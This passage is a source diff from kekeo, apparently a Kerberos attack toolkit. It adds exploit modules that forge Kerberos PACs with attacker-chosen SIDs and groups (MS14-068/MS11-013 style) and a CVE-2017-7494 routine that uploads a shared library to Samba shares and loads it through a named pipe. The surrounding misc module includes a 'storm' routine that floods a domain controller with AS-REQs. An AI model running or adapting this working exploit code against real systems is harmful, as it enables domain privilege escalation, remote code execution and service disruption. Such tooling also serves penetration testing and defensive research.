+				if(kuhl_m_exploit_give_pac(argc, argv, &encAsRepPart->authtime, infos, socket, &pac))
+				{
+					if(TgsRep && encTgsRepPart)
+					{
+						*TgsRep = NULL;
+						*encTgsRepPart = NULL;
+						if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &AsRep->cname, AsRep->crealm, &encAsRepPart->sname, 0, &AsRep->ticket, &encAsRepPart->key, NULL, &pac, NULL))
+						{
+							if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) TgsRep, TGS_REP_PDU))
+							{
+								if(!(status = kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(*TgsRep, &encAsRepPart->key, EncTGSRepPart_PDU, encTgsRepPart)))
+									ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, *TgsRep);
+							}
+							ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
+						}
+					}
+					else if(szService)
+					{
+						if(dupService = _wcsdup(szService))
+						{
+							for(nextSetToken = NULL, SetToken = wcstok_s(dupService, L",", &nextSetToken); SetToken; SetToken = wcstok_s(NULL, L",", &nextSetToken))
+							{
+								kull_m_kerberos_asn1_PrincipalName_create_fromName(&pService, SetToken);
+								kprintf(L"  ");
+								kull_m_kerberos_asn1_PrincipalName_descr(&pService, FALSE);
+								kprintf(L"\n");
+								if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &AsRep->cname, AsRep->crealm, &pService, 0, &AsRep->ticket, &encAsRepPart->key, NULL, NULL, NULL))
+								{
+									if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRepService, TGS_REP_PDU))
+									{
+										if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRepService, &encAsRepPart->key, EncTGSRepPart_PDU, &encTgsRepPartService))
+										{
+											kull_m_kerberos_asn1_KdcRep_save(TgsRepService, encTgsRepPartService, NULL, L"_(ms11013)", callback);
+											ossFreePDU(&kull_m_kerberos_asn1_world, EncTGSRepPart_PDU, encTgsRepPartService);
+										}
+										ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRepService);
+									}
+									ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
+								}
+								kull_m_kerberos_asn1_PrincipalName_delete(&pService);
+							}
+							free(dupService);
+						}
+					}
+				}
+				else PRINT_ERROR(L"Unable to build a PAC\n");
+				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, encAsRepPart);
+				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, AsRep);
+			}
+			if(reusesocket)
+				*reusesocket = socket;
+			else kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
+		}
+		if(reuseinfos)
+			*reuseinfos = infos;
+		else kull_m_kerberos_asn1_Authinfos_delete(infos);
+	}
+	return status;
+}
+
+BOOL kuhl_m_exploit_give_pac(int argc, wchar_t * argv[], KerberosTime *authtime, PKIWI_AUTH_INFOS infos, PKULL_M_SOCK socket, _octet1 *pac)
+{
+	PCWSTR szData;
+	PISID sid = NULL;
+	DWORD rid = 0, cbGroups = 0, cbSids = 0, i;
+	PGROUP_MEMBERSHIP groups = NULL;
+	PKERB_SID_AND_ATTRIBUTES sids = NULL;
+	PCLAIMS_SET claims = NULL;
+	PKERB_VALIDATION_INFO validationInfo;
+	FILETIME ftAuthTime;
+
+	AS_REP *asrep = NULL;
+	EncKDCRepPart *enckdcreppart = NULL;
+	OssBuf TgsReq = {0, NULL};
+	TGS_REP *TgsRep = NULL;
+	_octet1 tmpPac;
+	BOOL oldNeedPac;
+
+	pac->length = 0;
+	pac->value = NULL;
+	if(kull_m_string_args_byName(argc, argv, L"sid", &szData, NULL))
+		if(!ConvertStringSidToSid(szData, (PSID *) &sid))
+			PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
+	if(kull_m_string_args_byName(argc, argv, L"id", &szData, NULL) || kull_m_string_args_byName(argc, argv, L"rid", &szData, NULL))
+		rid = wcstoul(szData, NULL, 0);
+	kull_m_string_args_byName(argc, argv, L"groups", &szData, NULL);
+	kuhl_m_pac_stringToGroups(szData, &groups, &cbGroups);
+	if(kull_m_string_args_byName(argc, argv, L"sids", &szData, NULL))
+		kuhl_m_pac_stringToSids(szData, &sids, &cbSids);
+	if(kull_m_string_args_byName(argc, argv, L"claims", &szData, NULL))
+		claims = kuhl_m_kerberos_claims_createFromString(szData);
+
+	if(!(sid && rid))
+	{
+		oldNeedPac = infos->needPac;
+		infos->needPac = TRUE;
+		if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &asrep, &enckdcreppart, NULL))
+		{
+			if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &asrep->cname, asrep->crealm, &asrep->cname, KERB_KDCOPTION_standard | KERB_KDCOPTION_enc_tkt_in_skey, &asrep->ticket, &enckdcreppart->key, &asrep->ticket, NULL, NULL))
+			{
+				if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
+				{
+					if(kull_m_kerberos_asn1_PAC_from_EncTicketPart(&enckdcreppart->key, &TgsRep->ticket.enc_part, &tmpPac))
+					{
+						if(!kuhl_m_kerberos_pac_to_infos((PPACTYPE) tmpPac.value, tmpPac.length, &sid, &rid))
+							PRINT_ERROR(L"Unable to get SID and/or RID from a PAC\n");
+						if(tmpPac.value)
+							LocalFree(tmpPac.value);
+					}
+					else PRINT_ERROR(L"No PAC found\n");
+					ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep);
+				}
+				ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
+			}
+			ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, enckdcreppart);
+			ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, asrep);
+		}
+		infos->needPac = oldNeedPac;
+	}
+
+	if(sid && rid && groups && cbGroups)
+	{
+		kull_m_kerberos_asn1_KerberosTime_to_filetime(authtime, &ftAuthTime);
+		kprintf(L"AuthTime     : ");
+		kull_m_string_displayLocalFileTime(&ftAuthTime);
+		kprintf(L"\nDomain SID   : ");
+		kull_m_string_displaySID(sid);
+		kprintf(L"\nUser RID     : %u\nGroups       : *", rid);
+		for(i = 0; i < cbGroups; i++)
+			kprintf(L"%u ", groups[i].RelativeId);
+		kprintf(L"\n");
+		if(sids && cbSids)
+		{
+			kprintf(L"Extra SIDs   :\n");
+			for(i = 0; i < cbSids; i++)
+			{
+				kprintf(L"  ");
+				kull_m_string_displaySID(sids[i].Sid);
+				kprintf(L"\n");
+			}
+		}
+		if(claims)
+		{
+			kprintf(L"Claims       :\n");
+			kuhl_m_kerberos_claims_displayClaimsSet(claims);
+			kprintf(L"\n");
+		}
+		
+		if(validationInfo = kuhl_m_pac_infoToValidationInfo(&ftAuthTime, infos->w_short_cname, infos->w_realm, infos->w_short_realm, sid, rid, groups, cbGroups, sids, cbSids))
+		{
+			if(kuhl_m_pac_validationInfo_to_PAC(validationInfo, &ftAuthTime, infos->w_cname, KERB_CHECKSUM_MD5, claims, (PPACTYPE *) &pac->value, (DWORD *) &pac->length))
+			{
+				if(!NT_SUCCESS(kuhl_m_pac_signature((PPACTYPE) pac->value, pac->length, KERB_CHECKSUM_MD5, NULL, 0)))
+				{
+					LocalFree(pac->value);
+					pac->length = 0;
+					pac->value = NULL;
+				}
+			}
+			LocalFree(validationInfo);
+		}
+	}
+
+	if(sid)
+		LocalFree(sid);
+	if(groups && cbGroups)
+		LocalFree(groups);
+	if(sids && cbSids)
+	{
+		for(i = 0; i < cbSids; i++)
+			LocalFree(sids[i].Sid);
+		LocalFree(sids);
+	}
+	if(claims)
+		kuhl_m_kerberos_claims_free(claims);
+	return (pac->value != NULL);
+}
+
+NTSTATUS kuhl_m_exploit_cve20177494(int argc, wchar_t * argv[])
+{
+	NET_API_STATUS nStatus;
+	LPSERVER_INFO_102 pServerInfo;
+	LPSHARE_INFO_502 pShareInfo;
+	DWORD i, dwEntriesRead, dwTotalEntries, dwResumeHandle = 0;
+	LPWSTR destfilename, remotelocalfilename, pipename;
+	LPCWSTR szServer, szFilename, szBaseFileName;
+
+	if(kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL))
+	{
+		kprintf(L"Server: %s\n", szServer);
+		if(kull_m_string_args_byName(argc, argv, L"module", &szFilename, NULL))
+		{
+			szBaseFileName = PathFindFileName(szFilename);
+			kprintf(L"Module: %s (%s)\n", szFilename, szBaseFileName);
+			nStatus = NetServerGetInfo((LPWSTR) szServer, 102, (LPBYTE*) &pServerInfo);
+			if(nStatus == NERR_Success)
+			{
+				if(pServerInfo->sv102_type & SV_TYPE_SERVER_UNIX)
+				{
+					do
+					{
+						nStatus = NetShareEnum ((LPWSTR) szServer, 502, (LPBYTE*) &pShareInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);
+						if((nStatus == 0) || (nStatus == ERROR_MORE_DATA))
+						{
+							for (i = 0; i < dwEntriesRead; i++)
+							{
+								if((pShareInfo[i].shi502_type & STYPE_MASK) == STYPE_DISKTREE)
+								{
+									kprintf(L"\n* %s ( %s )\n", pShareInfo[i].shi502_netname, pShareInfo[i].shi502_path);
+									if(destfilename = kuhl_m_exploit_cve20177494_getDestFilename(szBaseFileName, szServer, pShareInfo[i].shi502_netname))
+									{
+										kprintf(L"  destfilename       : %s\n", destfilename);
+										if(remotelocalfilename = kuhl_m_exploit_cve20177494_getRemoteLocalFilename(szBaseFileName, pShareInfo[i].shi502_path))
+										{
+											kprintf(L"  remotelocalfilename: %s\n", remotelocalfilename);
+											if(pipename = kuhl_m_exploit_cve20177494_getPipeName(szServer, remotelocalfilename))
+											{
+												kprintf(L"  pipename           : %s\n", pipename);	
+												if(CopyFileEx(szFilename, destfilename, NULL, NULL, NULL, 0))
+												{
+													kprintf(L"  > file \'%s\' is now on server\n", szBaseFileName);
+													if(kull_m_file_isFileExist(pipename))
+													{
+														kprintf(L"  + Server confirmed pipe was registered!\n");
+														dwEntriesRead = 0; // will stop enum
+													}
+													else if(GetLastError() == ERROR_FILE_NOT_FOUND)
+													{
+														kprintf(L"  - Server returned FILE_NOT_FOUND (not vulnerable, or can be normal if the module does not register itself, check by another way)\n");
+														dwEntriesRead = 0; // will stop enum too, not a real success, but few chance we'll load better in another share...
+													}
+													else if(GetLastError() == ERROR_NETNAME_DELETED)
+													{
+														kprintf(L"  - NETNAME_DELETED (something went very bad... but can be \"\"normal\"\" with Synology DSM 5.2 as it run init function anyway...)\n");
+														dwEntriesRead = 0; // will stop enum too, may be a bad success, but few chance we'll load better in another share...
+													}
+													else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");
+
+													if(DeleteFile(destfilename))
+														kprintf(L"  < file was deleted\n");
+													else PRINT_ERROR_AUTO(L"DeleteFile");
+												}
+												else if(GetLastError() == ERROR_ACCESS_DENIED)
+													kprintf(L"  - Access denied\n");
+												else PRINT_ERROR_AUTO(L"CopyFileEx");
+												LocalFree(pipename);
+											}
+											LocalFree(remotelocalfilename);
+										}
+										LocalFree(destfilename);
+									}
+								}
+							}
+							NetApiBufferFree(pShareInfo);
+						}
+						else PRINT_ERROR(L"NetShareEnum: %08x\n", nStatus);
+					}
+					while (nStatus == ERROR_MORE_DATA);
+				}
+				else PRINT_ERROR(L"Server type is not UNIX\n");
+				NetApiBufferFree(pServerInfo);
+			}
+			else PRINT_ERROR(L"NetServerGetInfo: %08x\n", nStatus);
+		}
+		else PRINT_ERROR(L"Argument \'/module:lib_smb_pipe.so\' is needed\n");
+	}
+	else PRINT_ERROR(L"Argument \'/server:{name|ip}\' is needed\n");
+	return STATUS_SUCCESS;
+}
+
+PWSTR kuhl_m_exploit_cve20177494_getDestFilename(LPCWSTR filename, LPCWSTR servername, LPCWSTR share)
+{
+	PWSTR result = NULL;
+	int len = _snwprintf(NULL, 0, L"\\\\%s\\%s\\%s", servername, share, filename);
+	if(len > 0)
+		if(result = (PWSTR) LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t)))
+			if(_snwprintf(result, len + 1, L"\\\\%s\\%s\\%s", servername, share, filename) < len)
+				result = (PWSTR) LocalFree(result);
+	return result;
+}
+
+PWSTR kuhl_m_exploit_cve20177494_getRemoteLocalFilename(LPCWSTR filename, LPWSTR path)
+{
+	PWSTR result = NULL;
+	DWORD i, dwPath = lstrlenW(path);
+	int len;
+
+	if(dwPath > 2)
+	{
+		if(path[1] == L':')
+		{
+			path += 2;
+			dwPath -= 2;
+		}
+		
+		for(i = 0; i < dwPath; i++)
+			if(path[i] == L'\\')
+				path[i] = L'/';
+
+		if(path[dwPath - 1] == L'/')
+			path[dwPath - 1] = L'\0';
+
+		len = _snwprintf(NULL, 0, L"%s/%s", path, filename);
+		if(len > 0)
+			if(result = (PWSTR) LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t)))
+				if(_snwprintf(result, len + 1, L"%s/%s", path, filename) < len)
+					result = (PWSTR) LocalFree(result);
+	}
+	return result;
+}
+
+PWSTR kuhl_m_exploit_cve20177494_getPipeName(LPCWSTR servername, LPCWSTR remotelocalfilename)
+{
+	PWSTR result = NULL;
+	int len = _snwprintf(NULL, 0, L"\\??\\UNC\\%s\\pipe\\%s", servername, remotelocalfilename);
+	if(len > 0)
+		if(result = (PWSTR) LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t)))
+			if(_snwprintf(result, len + 1, L"\\??\\UNC\\%s\\pipe\\%s", servername, remotelocalfilename) < len)
+				result = (PWSTR) LocalFree(result);
+	return result;
 }
\ No newline at end of file
diff --git a/kekeo/modules/kuhl_m_exploit.h b/kekeo/modules/kuhl_m_exploit.h
index 5ce2261..1426e49 100644
--- a/kekeo/modules/kuhl_m_exploit.h
+++ b/kekeo/modules/kuhl_m_exploit.h
@@ -1,21 +1,27 @@
-/*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
-	Licence : https://creativecommons.org/licenses/by/4.0/
-*/
-#pragma once
-#include "kuhl_m.h"
-#include "../../modules/asn1/kull_m_kerberos_asn1.h"
-#include "../../modules/asn1/kull_m_kerberos_asn1_authinfos.h"
-#include "kerberos/kuhl_m_kerberos_pac.h"
-#include "kerberos/kuhl_m_kerberos.h"
-#include <NtDsAPI.h>
-
-const KUHL_M kuhl_m_exploit;
-
-NTSTATUS kuhl_m_exploit_ms14068(int argc, wchar_t * argv[]);
-NTSTATUS kuhl_m_exploit_ms11013(int argc, wchar_t * argv[]);
-
-PWSTR kuhl_m_exploit_ms14068_getname(PCWSTR pre, PCWSTR post);
-BOOL kuhl_m_exploit_generic_ms(int argc, wchar_t * argv[], TGS_REP **TgsRep, EncTGSRepPart **encTgsRepPart, PCWSTR szService, PKIWI_AUTH_INFOS *reuseinfos, PKULL_M_SOCK *reusesocket);
-BOOL kuhl_m_exploit_give_pac(int argc, wchar_t * argv[], KerberosTime *authtime, PKIWI_AUTH_INFOS infos, PKULL_M_SOCK socket, _octet1 *pac);
\ No newline at end of file
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#pragma once
+#include "kuhl_m.h"
+#include "../../modules/asn1/kull_m_kerberos_asn1.h"
+#include "../../modules/asn1/kull_m_kerberos_asn1_authinfos.h"
+#include "../../modules/kull_m_net.h"
+#include "kerberos/kuhl_m_kerberos_pac.h"
+#include "kerberos/kuhl_m_kerberos.h"
+#include <NtDsAPI.h>
+
+const KUHL_M kuhl_m_exploit;
+
+NTSTATUS kuhl_m_exploit_ms14068(int argc, wchar_t * argv[]);
+NTSTATUS kuhl_m_exploit_ms11013(int argc, wchar_t * argv[]);
+NTSTATUS kuhl_m_exploit_cve20177494(int argc, wchar_t * argv[]);
+
+PWSTR kuhl_m_exploit_ms14068_getname(PCWSTR pre, PCWSTR post);
+BOOL kuhl_m_exploit_generic_ms(int argc, wchar_t * argv[], TGS_REP **TgsRep, EncTGSRepPart **encTgsRepPart, PCWSTR szService, PKIWI_AUTH_INFOS *reuseinfos, PKULL_M_SOCK *reusesocket);
+BOOL kuhl_m_exploit_give_pac(int argc, wchar_t * argv[], KerberosTime *authtime, PKIWI_AUTH_INFOS infos, PKULL_M_SOCK socket, _octet1 *pac);
+
+PWSTR kuhl_m_exploit_cve20177494_getDestFilename(LPCWSTR filename, LPCWSTR servername, LPCWSTR share);
+PWSTR kuhl_m_exploit_cve20177494_getRemoteLocalFilename(LPCWSTR filename, LPWSTR path);
+PWSTR kuhl_m_exploit_cve20177494_getPipeName(LPCWSTR servername, LPCWSTR remotelocalfilename);
\ No newline at end of file
diff --git a/kekeo/modules/kuhl_m_misc.c b/kekeo/modules/kuhl_m_misc.c
index 74613aa..d618e1a 100644
--- a/kekeo/modules/kuhl_m_misc.c
+++ b/kekeo/modules/kuhl_m_misc.c
@@ -1,465 +1,465 @@
-/*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
-	Licence : https://creativecommons.org/licenses/by/4.0/
-*/
-#include "kuhl_m_misc.h"
-
-const KUHL_M_C kuhl_m_c_misc[] = {
-	{kuhl_m_misc_changepw,	L"changepw",	L"Change user password (AoratoPw)"},
-	{kuhl_m_misc_convert,	L"convert",		L"Convert tickets"},
-	{kuhl_m_misc_storm,		L"storm",		L"Kerberos Storm!"},
-	{kuhl_m_misc_arch,		L"arch",		L"Ask RPC for NDR64 support"},
-};
-const KUHL_M kuhl_m_misc = {
-	L"misc",	L"Miscellaneous module", NULL,
-	ARRAYSIZE(kuhl_m_c_misc), kuhl_m_c_misc, NULL, NULL
-};
-
-NTSTATUS kuhl_m_misc_changepw(int argc, wchar_t * argv[])
-{
-	PCWSTR szData;
-	PWSTR domain;
-	PKULL_M_SOCK socket;
-
-	KRB_CRED *KrbCred = NULL;
-	EncKrbCredPart *encKrbCred = NULL;
-
-	AP_REP *ApRep = NULL;
-	KRB_PRIV *KrbPriv = NULL;
-	EncKrbPrivPart *encKrbPrivPart = NULL;
-	EncryptionKey authKey;
-	UInt32 seq;
-
-	OssBuf ApReq = {0, NULL}, KrbPrivReq = {0, NULL};
-	USHORT version;
-	_octet1 data;
-
-	if(kull_m_string_args_byName(argc, argv, L"tgt", &szData, NULL))
-	{
-		kprintf(L"Ticket  : %s\n", szData);
-		if(kull_m_kerberos_asn1_KrbCred_load(szData, NULL, &KrbCred, &encKrbCred))
-		{
-			if(domain = kull_m_string_qad_ansi_to_unicode(KrbCred->tickets->value.realm))
-			{
-				if(version = kull_m_kerberos_asn1_Authinfos_changepw(&data, argc, argv, KrbCred->tickets->value.realm))
-				{
-					if(kull_m_kerberos_asn1_ApReq_build(&ApReq, &encKrbCred->ticket_info->value.pname, encKrbCred->ticket_info->value.prealm, &KrbCred->tickets->value, &encKrbCred->ticket_info->value.key, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &authKey, &seq))
-					{
-						if(kull_m_kerberos_asn1_KrbPriv_build(&data, &authKey, "wtf", &KrbPrivReq, &seq))
-						{
-							if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(domain, KPASSWD_DEFAULT_PORT, argc, argv, TRUE))
-							{
-								if(kull_m_kerberos_asn1_net_callKadminOssBuf(socket, version, &ApReq, &KrbPrivReq, &ApRep, &KrbPriv))
-								{
-									if(kull_m_kerberos_asn1_EncKrbPrivPart_from_Priv_build(KrbPriv, &encKrbPrivPart, &authKey))
-									{
-										kprintf(L"[changepw] ");
-										kull_m_kadmin_passwd_retFromKadmin(&encKrbPrivPart->user_data);
-										ossFreePDU(&kull_m_kerberos_asn1_world, EncKrbPrivPart_PDU, encKrbPrivPart);
-									}
-									ossFreePDU(&kull_m_kerberos_asn1_world, KRB_PRIV_PDU, KrbPriv);
-									ossFreePDU(&kull_m_kerberos_asn1_world, AP_REP_PDU, ApRep);
-								}
-								kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
-							}
-							ossFreeBuf(&kull_m_kerberos_asn1_world, KrbPrivReq.value);
-						}
-						if(authKey.keyvalue.value)
-							LocalFree(authKey.keyvalue.value);
-						ossFreeBuf(&kull_m_kerberos_asn1_world, ApReq.value);
-					}
-					LocalFree(data.value);
-				}
-			}
-			ossFreePDU(&kull_m_kerberos_asn1_world, EncKrbCredPart_PDU, encKrbCred);
-			ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred);
-		}
-	}
-	else PRINT_ERROR(L"A TGT is needed ( /tgt:filename.kirbi )\n");
-	return STATUS_SUCCESS;
-}
-
-const KULL_M_KADMIN_PASSWD_ERR kull_m_kadmin_passwd_err[] = {
-	{0,	L"KRB5_KPASSWD_SUCCESS"},
-	{1,	L"KRB5_KPASSWD_MALFORMED"},
-	{2,	L"KRB5_KPASSWD_HARDERROR"},
-	{3,	L"KRB5_KPASSWD_AUTHERROR"},
-	{4,	L"KRB5_KPASSWD_SOFTERROR"},
-	{5,	L"KRB5_KPASSWD_ACCESSDENIED"},
-	{6,	L"KRB5_KPASSWD_BAD_VERSION"},
-	{7,	L"KRB5_KPASSWD_INITIAL_FLAG_NEEDED"},
-};
-PCWSTR kull_m_kadmin_passwd_err_to_string(DWORD id)
-{
-	DWORD i;
-	for(i = 0; i < ARRAYSIZE(kull_m_kadmin_passwd_err); i++)
-		if(kull_m_kadmin_passwd_err[i].id == id)
-			return kull_m_kadmin_passwd_err[i].name;
-	return L"ERROR ?";
-}
-
-void kull_m_kadmin_passwd_retFromKadmin(_octet1 * data)
-{
-	WORD code;
-	if(data->length >= 2)
-	{
-		if(code = _byteswap_ushort(*(PWORD) data->value))
-			kprintf(L"%s (%u)", kull_m_kadmin_passwd_err_to_string(code), code);
-		else kprintf(L"OK");
-		if(data->length > 2)
-		{
-			kprintf(L" - {");
-			kull_m_string_wprintf_hex(data->value + 2, data->length - 2, 0);
-			kprintf(L"}");
-		}
-		kprintf(L"\n");
-	}
-	else PRINT_ERROR(L"Size\n");
-}
-
-const KERB_FORMAT_MODULE modules[] = {
-	{L"MIT Credential Cache", kiwi_ccache_valid_header, kiwi_ccache_read, kiwi_ccache_write, L"ccache", L"ccaches"},
-	{L"RFC KRB-CRED (#22)", kiwi_krbcred_valid_header, kiwi_krbcred_read, kiwi_krbcred_write, L"kirbi", L"kirbis"},
-	{L"WCE \'windows wce\'", kiwi_wce_valid_header, kiwi_wce_read, kiwi_wce_write, L"wce", L"wces"},
-	{L"Microsoft LSA API", NULL, NULL, kiwi_lsa_write, NULL, L"lsa"},
-};
-NTSTATUS kuhl_m_misc_convert(int argc, wchar_t * argv[])
-{
-	DWORD i, j;
-	KERB_FORMAT_MODULE const * readModule, * writeModule;
-	OssBuf input, output = {0, NULL};
-	KRB_CRED *cred = NULL, *dst = NULL;
-	BOOL explodeIt;
-
-	if(argc > 1)
-	{
-		writeModule = NULL;
-		for(j = 0; j < ARRAYSIZE(modules); j++)
-		{
-			if(modules[j].simpleName && !_wcsicmp(modules[j].simpleName, argv[0]))
-			{
-				writeModule = &modules[j];
-				explodeIt = FALSE;
-				break;
-			}
-			else if(modules[j].multiName && !_wcsicmp(modules[j].multiName, argv[0]))
-			{
-				writeModule = &modules[j];
-				explodeIt = TRUE;
-				break;
-			}
-		}
-
-		if(writeModule)
-		{
-			kprintf(L"Destination : %s (%s)\n", writeModule->shortName, explodeIt ? L"multiple" : L"simple");
-			for(i = 1; i < (DWORD) argc ; i++)
-			{
-				kprintf(L" < %s ", argv[i]);
-				if(kull_m_file_readData(argv[i], &input.value, (PDWORD) &input.length))
-				{
-					readModule = NULL;
-					for(j = 0; j < ARRAYSIZE(modules); j++)
-					{
-						if(modules[j].validHeader)
-						{
-							if(modules[j].validHeader(&input))
-							{
-								readModule = &modules[j];
-								break;
-							}
-						}
-					}
-
-					if(readModule)
-					{
-						kprintf(L"(%s) ", readModule->shortName);
-						if(readModule->readData && readModule->readData(&input, &cred))
-						{
-							addCred(cred, &dst);
-							ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, cred);
-						}
-						else kprintf(L": error when reading!");
-					}
-					else kprintf(L": format not recognized!");
-					kprintf(L"\n");
-					LocalFree(input.value);
-				}
-				else PRINT_ERROR_AUTO(L"kull_m_file_readData");
-			}
-
-			if(dst)
-			{
-				writeData(writeModule, explodeIt, dst);
-				ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, dst);
-			}
-		}
-	}
-	else PRINT_ERROR(L"Arguments missing! kirbi|ccache|wce|lsa|kirbis|ccaches|wces ticket1 [ticket2] [...]\n");
-	return STATUS_SUCCESS;
-}
-
-// globals for performances
-LIST_ENTRY gUserList = {&gUserList, &gUserList};
-PSTR gDomain;
-NTSTATUS kuhl_m_misc_storm(int argc, wchar_t * argv[])
-{
-	BOOL sockError = FALSE;
-	DWORD retry, i, total, dataOutSize;
-	IPPROTO mode = IPPROTO_TCP;
-	PBERVAL pBerVal = NULL;
-	KULL_M_SOCK fullsocket;
-	PVOID dataOut;
-	PKIWI_USERNAMEA entry, tmp;
-	FILETIME fTime;
-	LPCWSTR szDc, szDomain, szNum;
-
-	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) && kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
-	{
-		gDomain = kull_m_string_unicode_to_ansi(szDomain);
-		
-		kull_m_string_args_byName(argc, argv, L"retry", &szNum, L"20");
-		retry = wcstoul(szNum, NULL, 0);
-		kprintf(L"DC name    : %s\nDomain FQDN: %s\nLogon retry: %u\nMode       : ", szDc, szDomain, retry);
-		if(kull_m_string_args_byName(argc, argv, L"udp", NULL, NULL))
-		{
-			mode = IPPROTO_UDP;
-			kprintf(L"UDP");
-		}
-		else kprintf(L"TCP");
-
-		GetSystemTimeAsFileTime(&fTime); kprintf(L"\n> Retrieving user list : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
-		if(total = kuhl_m_misc_storm_giveUsersForServer(szDc))
-		{
-			GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
-			if(kull_m_sock_init_addr_protocol(szDc, NULL, KERBEROS_DEFAULT_PORT, mode, &fullsocket))
-			{
-				if(kull_m_sock_connect(&fullsocket))
-				{
-					GetSystemTimeAsFileTime(&fTime); kprintf(L"> Sending AS-REQ       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
-					for(entry = (PKIWI_USERNAMEA) gUserList.Flink; !sockError && (entry != (PKIWI_USERNAMEA) &gUserList); entry = (PKIWI_USERNAMEA) entry->navigator.Flink)
-					{
-						if(pBerVal = kuhl_m_misc_storm_giveBERForUser(&entry->username))
-						{
-							for(i = 0; !sockError && (i < retry); i++)
-							{
-								if(kull_m_kerberos_asn1_net_SendAndRecv(&fullsocket, pBerVal->bv_val, pBerVal->bv_len, &dataOut, &dataOutSize))
-									LocalFree(dataOut);
-								else sockError = TRUE;
-							}
-							ber_bvfree(pBerVal);
-						}
-					}
-					GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of AS-REQ        : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
-				}
-				kull_m_sock_termSocket(&fullsocket);
-			}
-
-			GetSystemTimeAsFileTime(&fTime); kprintf(L"> Free user list       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
-			for(entry = (PKIWI_USERNAMEA) gUserList.Flink; entry != (PKIWI_USERNAMEA) &gUserList; entry = tmp)
-			{
-				tmp = (PKIWI_USERNAMEA) entry->navigator.Flink;
-				RtlFreeAnsiString(&entry->username);
-				LocalFree(entry);
-			}
-			gUserList.Blink = gUserList.Flink = &gUserList;
-			GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
-		}
-		else PRINT_ERROR(L"unable to get users\n");
-
-		LocalFree(gDomain);
-	}
-	else PRINT_ERROR(L"/dc:<dc.fqdn.local> /domain:<fqdn.local> required\n");
-	return STATUS_SUCCESS;
-}
-
-BOOL kuhl_m_misc_storm_add(PCUNICODE_STRING name)
-{
-	BOOL status = FALSE;
-	PKIWI_USERNAMEA ua;
-	if(ua = (PKIWI_USERNAMEA) LocalAlloc(LPTR, sizeof(KIWI_USERNAMEA)))
-	{
-		ua->navigator.Blink = gUserList.Blink;
-		ua->navigator.Flink = &gUserList;
-		((PKIWI_USERNAMEA) gUserList.Blink)->navigator.Flink = (PLIST_ENTRY) ua;
-		gUserList.Blink= (PLIST_ENTRY) ua;
-		status = NT_SUCCESS(RtlUnicodeStringToAnsiString(&ua->username, name, TRUE));
-	}
-	return status;
-}
-
-const BYTE
-	reqFlags[] = {0x00, 0x40, 0x80, 0x00, 0x10},
-	nullPATS[] = {0x30, 0x36, 0xa0, 0x03, 0x02, 0x01, 0x17, 0xa2, 0x2f, 0x04, 0x2d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-PBERVAL kuhl_m_misc_storm_giveBERForUser(PCANSI_STRING user)
-{
-	BerElement *pBer;
-	PBERVAL pBerVal = NULL;
-	if(pBer = ber_alloc_t(LBER_USE_DER))
-	{
